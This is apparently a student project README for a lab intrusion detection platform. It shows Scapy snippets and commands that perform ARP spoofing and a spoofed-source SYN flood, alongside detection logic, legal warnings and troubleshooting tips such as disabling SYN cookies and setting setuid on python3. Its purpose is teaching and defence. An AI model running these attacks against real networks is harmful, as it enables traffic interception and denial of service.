# 🔐 Cybersecurity IDS Platform - Complete Guide

**Network Intrusion Detection System with ARP Spoofing & SYN Flood Attacks**

---

## 📋 Table of Contents

1. [Project Overview](#project-overview)
2. [Architecture](#architecture)
3. [System Requirements](#system-requirements)
4. [VMware Network Setup](#vmware-network-setup)
5. [Installation Guide](#installation-guide)
6. [How It Works](#how-it-works)
7. [Usage Guide](#usage-guide)
8. [Testing & Validation](#testing--validation)
9. [Troubleshooting](#troubleshooting)
10. [Security & Ethics](#security--ethics)

---

## 🎯 Project Overview

This project demonstrates **network security concepts** through practical implementation of:
- **ARP Spoofing (Man-in-the-Middle Attack)**
- **SYN Flood (Denial of Service Attack)**
- **Intrusion Detection System (IDS)**

**Authors:** Kaouther Ben Salah, Mohamed Firas Ben Hmida, Houssem Eddine Ben Chaabane  
**Class:** 4-ING-J-SSIR4  
**Framework:** Django 4.2+  
**Language:** Python 3.8+

### ⚠️ IMPORTANT LEGAL NOTICE
This software is for **EDUCATIONAL PURPOSES ONLY**. Use only in authorized lab environments. Unauthorized use of these tools is **ILLEGAL**.

---

## 🏗️ Architecture

### System Components

```
┌─────────────────────────────────────────────────────────────────┐
│                    WINDOWS 11 HOST MACHINE                      │
│                                                                 │
│  ┌───────────────────────────────────────────────────────┐    │
│  │        Django Web Interface (Control Panel)           │    │
│  │  - ARP Attack Controls                                │    │
│  │  - SYN Flood Controls                                 │    │
│  │  - Real-time Monitoring                               │    │
│  └───────────────────────────────────────────────────────┘    │
│                           │                                     │
│                           │ HTTP/WebSocket                      │
└───────────────────────────┼─────────────────────────────────────┘
                            │
                ┌───────────┴───────────┐
                │   VMware NAT Network  │
                │   192.168.XXX.0/24    │
                └───────────┬───────────┘
                            │
        ┌───────────────────┼───────────────────┐
        │                   │                   │
┌───────▼────────┐  ┌──────▼───────┐  ┌────────▼────────┐
│  KALI LINUX    │  │   UBUNTU     │  │    UBUNTU       │
│   (ATTACKER)   │  │  (VICTIM)    │  │  (DEFENDER)     │
│                │  │              │  │                 │
│  - Scapy       │  │  - Web       │  │  - IDS Monitor  │
│  - Attack      │  │    Server    │  │  - Alert System │
│    Modules     │  │  - Services  │  │  - Log Analysis │
└────────────────┘  └──────────────┘  └─────────────────┘
```

### Network Topology

```
Role         | Machine      | IP Example      | Purpose
-------------|--------------|-----------------|---------------------------
Host         | Windows 11   | 192.168.XXX.1   | Control center
Attacker     | Kali Linux   | 192.168.XXX.10  | Launch attacks
Victim       | Ubuntu       | 192.168.XXX.20  | Target machine
Defender     | Ubuntu       | 192.168.XXX.30  | IDS monitoring
Gateway      | VMware NAT   | 192.168.XXX.2   | Network router
```

---

## 💻 System Requirements

### Windows Host (Your Machine)
- **OS:** Windows 11
- **RAM:** 8GB minimum (16GB recommended)
- **Disk:** 50GB free space
- **Software:**
  - VMware Workstation 16+ or VMware Player
  - Python 3.8+
  - Git

### Virtual Machines

#### 1. Kali Linux (Attacker)
- **RAM:** 2GB minimum
- **Disk:** 20GB
- **Network:** NAT
- **Tools:** Scapy, Python3

#### 2. Ubuntu (Victim)
- **RAM:** 1GB minimum
- **Disk:** 10GB
- **Network:** NAT
- **Services:** Apache2 or Nginx

#### 3. Ubuntu (Defender/IDS)
- **RAM:** 2GB minimum
- **Disk:** 15GB
- **Network:** NAT (Promiscuous mode)
- **Tools:** Scapy, Python3

---

## 🌐 VMware Network Setup

### Step 1: Configure VMware NAT Network

1. **Open VMware Workstation**
2. Go to `Edit` → `Virtual Network Editor`
3. Select `VMnet8 (NAT)`
4. Click `Change Settings` (admin required)
5. Note the **Subnet IP** (e.g., `192.168.189.0`)
6. Note the **Gateway IP** (e.g., `192.168.189.2`)

### Step 2: Configure Each VM

#### Kali Linux (Attacker)
```bash
# Set static IP
sudo nano /etc/network/interfaces

# Add:
auto eth0
iface eth0 inet static
    address 192.168.189.10
    netmask 255.255.255.0
    gateway 192.168.189.2
    dns-nameservers 8.8.8.8

# Restart network
sudo systemctl restart networking
```

#### Ubuntu Victim
```bash
# Set static IP
sudo nano /etc/netplan/01-netcfg.yaml

# Add:
network:
  version: 2
  ethernets:
    ens33:
      dhcp4: no
      addresses: [192.168.189.20/24]
      gateway4: 192.168.189.2
      nameservers:
        addresses: [8.8.8.8]

# Apply
sudo netplan apply
```

#### Ubuntu Defender
```bash
# Same as Victim but use IP: 192.168.189.30
# Enable promiscuous mode in VMware:
# VM Settings → Network Adapter → Advanced → Promiscuous Mode: Allow All
```

### Step 3: Verify Connectivity

From each VM:
```bash
# Test connectivity
ping 192.168.189.10  # Kali
ping 192.168.189.20  # Victim
ping 192.168.189.30  # Defender
ping 192.168.189.2   # Gateway
ping 8.8.8.8         # Internet
```

---

## 📦 Installation Guide

### Part 1: Windows Host Setup (Django Control Panel)

#### Step 1: Clone the Repository
```powershell
cd "C:\MINI PROJET PYTHON"
git clone https://github.com/kaoutherBenSalah/testIDS
cd testIDS
```

#### Step 2: Create Virtual Environment
```powershell
# Create virtual environment
python -m venv venv

# Activate it
.\venv\Scripts\Activate.ps1

# If execution policy error:
Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser
```

#### Step 3: Install Dependencies
```powershell
pip install --upgrade pip
pip install -r requirements.txt
```

#### Step 4: Configure Django
```powershell
# Apply database migrations
python manage.py migrate

# Create superuser (admin)
python manage.py createsuperuser

# Collect static files
python manage.py collectstatic --noinput
```

#### Step 5: Start Django Server
```powershell
# Start the web interface
python manage.py runserver 0.0.0.0:8000
```

Now open browser: `http://localhost:8000`

---

### Part 2: Kali Linux Setup (Attacker)

#### Step 1: Update System
```bash
sudo apt update && sudo apt upgrade -y
```

#### Step 2: Install Python Dependencies
```bash
# Install Python 3 and pip
sudo apt install python3 python3-pip -y

# Install Scapy and dependencies
pip3 install scapy psutil colorama

# Install network tools
sudo apt install net-tools nmap arp-scan -y
```

#### Step 3: Enable IP Forwarding
```bash
# Temporary (for testing)
sudo sysctl -w net.ipv4.ip_forward=1

# Permanent (survives reboot)
echo "net.ipv4.ip_forward=1" | sudo tee -a /etc/sysctl.conf
sudo sysctl -p
```

#### Step 4: Clone Project (Optional - for standalone use)
```bash
cd ~
git clone https://github.com/kaoutherBenSalah/testIDS
cd testIDS
```

---

### Part 3: Ubuntu Victim Setup

#### Step 1: Install Web Server
```bash
# Update system
sudo apt update && sudo apt upgrade -y

# Install Apache
sudo apt install apache2 -y

# Start Apache
sudo systemctl start apache2
sudo systemctl enable apache2

# Verify it's running
curl http://localhost
```

#### Step 2: Create Test Page
```bash
# Create a test page
echo "<h1>Ubuntu Victim Server - Running</h1>" | sudo tee /var/www/html/index.html
```

---

### Part 4: Ubuntu Defender Setup (IDS)

#### Step 1: Install Dependencies
```bash
# Update system
sudo apt update && sudo apt upgrade -y

# Install Python and tools
sudo apt install python3 python3-pip -y
pip3 install scapy psutil
```

#### Step 2: Clone IDS Project
```bash
cd ~
git clone https://github.com/kaoutherBenSalah/testIDS
cd testIDS
```

#### Step 3: Configure Promiscuous Mode
```bash
# Check network interface
ip addr

# Enable promiscuous mode (replace ens33 with your interface)
sudo ip link set ens33 promisc on

# Verify
ip link show ens33
```

---

## 🔬 How It Works

### Attack 1: ARP Spoofing (Man-in-the-Middle)

**What is ARP Spoofing?**
ARP (Address Resolution Protocol) maps IP addresses to MAC addresses. ARP Spoofing tricks devices into thinking the attacker's MAC address belongs to another IP (like the gateway or victim).

**Step-by-Step Process:**

1. **Normal Communication (Before Attack)**
```
Victim (192.168.189.20) → Gateway (192.168.189.2) → Internet
Victim's ARP Table:
  192.168.189.2 is at MAC: AA:BB:CC:DD:EE:FF (Real Gateway)
```

2. **Attacker Sends Fake ARP Packets**
```
Attacker (192.168.189.10) sends:
  "Hey Victim! 192.168.189.2 is actually at MAC: 11:22:33:44:55:66 (Attacker's MAC)"
```

3. **Victim's ARP Table is Poisoned**
```
Victim's ARP Table (POISONED):
  192.168.189.2 is at MAC: 11:22:33:44:55:66 (Attacker's MAC!)
```

4. **Traffic Flows Through Attacker**
```
Victim → Attacker (thinks it's gateway) → Real Gateway → Internet
         ↓
    Attacker can read/modify all traffic!
```

**Code Implementation:**
```python
# modules/arp_spoof.py
def spoof(target_ip, spoof_ip, target_mac):
    """Send fake ARP packet"""
    packet = ARP(
        op=2,                    # ARP reply (not request)
        pdst=target_ip,          # Destination: Victim
        hwdst=target_mac,        # Victim's MAC
        psrc=spoof_ip            # Claim to be Gateway
    )
    send(packet, verbose=False)
```

---

### Attack 2: SYN Flood (Denial of Service)

**What is SYN Flood?**
Exploits the TCP 3-way handshake to exhaust server resources.

**Normal TCP Handshake:**
```
1. Client → Server:  SYN (Synchronize)
2. Server → Client:  SYN-ACK (Synchronize-Acknowledge)
3. Client → Server:  ACK (Acknowledge)
   ✅ Connection Established
```

**SYN Flood Attack:**
```
1. Attacker → Server:  SYN (with fake source IP 1.2.3.4)
2. Server → 1.2.3.4:   SYN-ACK (waits for ACK...)
3. Attacker → Server:  SYN (with fake source IP 5.6.7.8)
4. Server → 5.6.7.8:   SYN-ACK (waits for ACK...)
   ... repeat 1000s of times ...
   
Server's connection queue is FULL → Can't accept legitimate connections!
```

**Code Implementation:**
```python
# modules/syn_flood.py
def _send_syn_packet(self):
    """Send TCP SYN with random source IP"""
    src_ip = self._generate_random_ip()  # Fake IP
    
    ip_layer = IP(src=src_ip, dst=self.target_ip)
    tcp_layer = TCP(sport=random.randint(1024, 65535), 
                    dport=self.target_port, 
                    flags="S")  # SYN flag
    
    packet = ip_layer / tcp_layer
    send(packet, verbose=False)
```

---

### Detection: How IDS Works

**ARP Spoofing Detection:**
```python
# modules/detector.py
def detect_arp_spoof(packet):
    """Detect duplicate IPs with different MACs"""
    if ARP in packet:
        ip = packet[ARP].psrc
        mac = packet[ARP].hwsrc
        
        # Check if we've seen this IP before with different MAC
        if ip in arp_table and arp_table[ip] != mac:
            ⚠️ ALERT: ARP Spoofing Detected!
            Old MAC: arp_table[ip]
            New MAC: mac
```

**SYN Flood Detection:**
```python
def detect_syn_flood(packet):
    """Detect abnormal SYN packet rate"""
    if TCP in packet and packet[TCP].flags == "S":
        current_rate = count_syn_packets_per_second()
        
        if current_rate > THRESHOLD:  # e.g., > 100 SYN/sec
            ⚠️ ALERT: SYN Flood Attack Detected!
```

---

## 🚀 Usage Guide

### Scenario 1: Launch ARP Spoofing Attack

#### From Django Web Interface (Windows):

1. **Open browser:** `http://localhost:8000`
2. **Navigate to:** "Attacker Interface"
3. **Fill in ARP Spoofing form:**
   - Target IP: `192.168.189.20` (Ubuntu Victim)
   - Gateway IP: `192.168.189.2` (VMware Gateway)
   - Interface: `eth0` (leave empty for auto)
   - Interval: `2` seconds
4. **Click:** "Start ARP Attack"
5. **Monitor:** Status box shows packets sent

#### From Kali Terminal (Alternative):

```bash
cd ~/testIDS
sudo python3 main.py --attack arp \
    --target 192.168.189.20 \
    --gateway 192.168.189.2 \
    --interface eth0
```

#### Verify Attack is Working:

On **Victim Machine** (Ubuntu):
```bash
# Check ARP table BEFORE attack
arp -a
# You'll see: 192.168.189.2 at AA:BB:CC:DD:EE:FF

# During attack, check again
arp -a
# You'll see: 192.168.189.2 at 11:22:33:44:55:66 (Attacker's MAC!)
```

On **Attacker Machine** (Kali):
```bash
# Monitor traffic (you'll see victim's packets!)
sudo tcpdump -i eth0 -n host 192.168.189.20
```

---

### Scenario 2: Launch SYN Flood Attack

#### From Django Web Interface:

1. **Navigate to:** "Attacker Interface"
2. **Fill in SYN Flood form:**
   - Target IP: `192.168.189.20` (Ubuntu Victim)
   - Target Port: `80` (Apache web server)
   - Threads: `10`
   - Duration: `60` seconds (or leave empty)
3. **Click:** "Start SYN Flood"

#### From Kali Terminal:

```bash
sudo python3 main.py --attack syn \
    --target 192.168.189.20 \
    --port 80 \
    --threads 10
```

#### Verify Attack Impact:

On **Victim Machine** (Ubuntu):
```bash
# Check connection queue (before attack)
netstat -an | grep :80 | grep SYN_RECV | wc -l
# Should be: 0 or very few

# During attack
netstat -an | grep :80 | grep SYN_RECV | wc -l
# Should be: 100+ connections in SYN_RECV state!

# Try to access web server from another machine
curl http://192.168.189.20
# Should timeout or be very slow
```

On **Attacker Machine**:
```bash
# Watch packets sent
sudo tcpdump -i eth0 'tcp[tcpflags] & tcp-syn != 0' -c 50
```

---

### Scenario 3: Monitor with IDS (Defender)

#### On Ubuntu Defender:

```bash
cd ~/testIDS
sudo python3 main.py --mode detector \
    --interface ens33 \
    --sensitivity high
```

**What You'll See:**
```
🔍 [ALERT] ARP Spoofing Detected!
    IP: 192.168.189.2
    Old MAC: AA:BB:CC:DD:EE:FF
    New MAC: 11:22:33:44:55:66
    Time: 2025-12-10 14:30:45

🔍 [ALERT] SYN Flood Detected!
    Target: 192.168.189.20:80
    Rate: 523 SYN packets/second
    Threshold: 100 packets/second
    Time: 2025-12-10 14:35:12
```

---

## 🧪 Testing & Validation

### Test Suite Overview

The project includes comprehensive testing scripts to validate all functionality.

### Test 1: Network Connectivity Test

**Purpose:** Verify all VMs can communicate

**Script:** `tests/test_connectivity.py`

```bash
# On each VM, run:
python3 tests/test_connectivity.py

# Expected Output:
✅ Ping to Attacker (192.168.189.10): Success
✅ Ping to Victim (192.168.189.20): Success
✅ Ping to Defender (192.168.189.30): Success
✅ Ping to Gateway (192.168.189.2): Success
✅ Ping to Internet (8.8.8.8): Success
```

### Test 2: ARP Spoofing Validation

**Purpose:** Verify ARP attack works and is detectable

**Script:** `tests/test_arp_attack.py`

```bash
# On Kali (Attacker):
sudo python3 tests/test_arp_attack.py \
    --target 192.168.189.20 \
    --gateway 192.168.189.2 \
    --duration 30

# Expected Results:
✅ ARP packets sent: 15
✅ Target ARP table poisoned: Yes
✅ Traffic intercepted: Yes
✅ IDS detected attack: Yes (check defender logs)
```

### Test 3: SYN Flood Validation

**Purpose:** Verify SYN flood impacts victim

**Script:** `tests/test_syn_flood.py`

```bash
# On Kali:
sudo python3 tests/test_syn_flood.py \
    --target 192.168.189.20 \
    --port 80 \
    --duration 30

# Expected Results:
✅ SYN packets sent: 5000+
✅ Victim connections in SYN_RECV: 200+
✅ Web server response time: >5 seconds (degraded)
✅ IDS detected attack: Yes
```

### Test 4: IDS Detection Accuracy

**Purpose:** Measure detection rate and false positives

**Script:** `tests/test_ids_accuracy.py`

```bash
# On Defender:
sudo python3 tests/test_ids_accuracy.py

# Expected Results:
✅ ARP Spoofing Detection Rate: >95%
✅ SYN Flood Detection Rate: >90%
✅ False Positive Rate: <5%
```

### Test 5: Django API Validation

**Purpose:** Test web interface endpoints

**Script:** `tests/test_django_api.py`

```bash
# On Windows:
python tests/test_django_api.py

# Expected Results:
✅ Dashboard loads: 200 OK
✅ Start ARP attack API: 200 OK
✅ Stop ARP attack API: 200 OK
✅ Start SYN attack API: 200 OK
✅ Attack statistics API: 200 OK
```

---

## 🐛 Troubleshooting

### Issue 1: "Permission denied" when running attacks

**Problem:** Scapy needs root privileges

**Solution:**
```bash
# Use sudo
sudo python3 main.py --attack arp ...

# Or run Python with sudo permanently (not recommended)
sudo chmod +s $(which python3)
```

### Issue 2: VMs can't ping each other

**Problem:** Network not configured correctly

**Solution:**
```bash
# Check VM network adapter is set to NAT
# VMware: VM Settings → Network Adapter → NAT

# Check firewall
sudo ufw disable  # Ubuntu
sudo systemctl stop firewalld  # Kali

# Verify IP addresses
ip addr
```

### Issue 3: "MAC address not found"

**Problem:** Target IP is not reachable or on different network

**Solution:**
```bash
# Verify target is reachable
ping 192.168.189.20

# Check if target is on same subnet
ip route

# Try arp-scan to discover devices
sudo arp-scan --interface=eth0 --localnet
```

### Issue 4: Django server won't start

**Problem:** Port 8000 already in use

**Solution:**
```powershell
# Check what's using port 8000
netstat -ano | findstr :8000

# Use different port
python manage.py runserver 0.0.0.0:8080
```

### Issue 5: ARP attack not working

**Problem:** IP forwarding not enabled

**Solution:**
```bash
# Check if enabled
sysctl net.ipv4.ip_forward

# Enable it
sudo sysctl -w net.ipv4.ip_forward=1

# Verify
cat /proc/sys/net/ipv4/ip_forward  # Should be 1
```

### Issue 6: SYN flood seems ineffective

**Problem:** Modern servers have SYN cookies protection

**Solution:**
```bash
# On victim (for testing only!), disable SYN cookies
sudo sysctl -w net.ipv4.tcp_syncookies=0

# Increase threads and rate
python main.py --attack syn --threads 50
```

---

## 🔒 Security & Ethics

### Legal Warning

**IMPORTANT:** These tools can cause serious harm if misused. You must:

1. ✅ **ONLY** use in authorized lab environments
2. ✅ Have **written permission** to test networks
3. ✅ Use on **your own** VMs and networks
4. ❌ **NEVER** use on public networks
5. ❌ **NEVER** use against systems you don't own

**Consequences of Misuse:**
- Criminal charges (Computer Fraud and Abuse Act)
- Civil lawsuits
- Expulsion from academic institutions
- Professional blacklisting

### Responsible Disclosure

If you discover vulnerabilities:
1. Don't exploit them
2. Report to system owners
3. Follow coordinated disclosure practices

### Educational Purpose

This project is designed to:
- Understand network security principles
- Learn penetration testing techniques
- Practice defensive security measures
- Prepare for cybersecurity careers (ethical hacking, SOC analyst, etc.)

---

## 📚 Additional Resources

### Learning Materials

**Network Security:**
- [TCP/IP Illustrated](https://www.amazon.com/TCP-Illustrated-Volume-Implementation/dp/0201633469)
- [Metasploit: The Penetration Tester's Guide](https://nostarch.com/metasploit)

**Python & Scapy:**
- [Scapy Documentation](https://scapy.readthedocs.io/)
- [Black Hat Python](https://nostarch.com/blackhatpython2E)

**Django:**
- [Django Official Tutorial](https://docs.djangoproject.com/en/4.2/intro/tutorial01/)

### Online Courses

- [Cybrary - Ethical Hacking](https://www.cybrary.it/)
- [SANS Cyber Aces](https://www.cyberaces.org/)
- [TryHackMe](https://tryhackme.com/)

---

## 👥 Authors & Contributors

**Project Team:**
- **Kaouther Ben Salah** - Project Lead
- **Mohamed Firas Ben Hmida** - Backend Development
- **Houssem Eddine Ben Chaabane** - Network Security

**Class:** 4-ING-J-SSIR4  
**Institution:** [Your University/School]  
**Year:** 2025

---

## 📄 License

This project is for **educational purposes only**. See LICENSE file for details.

---

## 🆘 Support

**Issues?** Open an issue on GitHub  
**Questions?** Contact project team

**Project Repository:** https://github.com/kaoutherBenSalah/testIDS

---

**Last Updated:** December 10, 2025
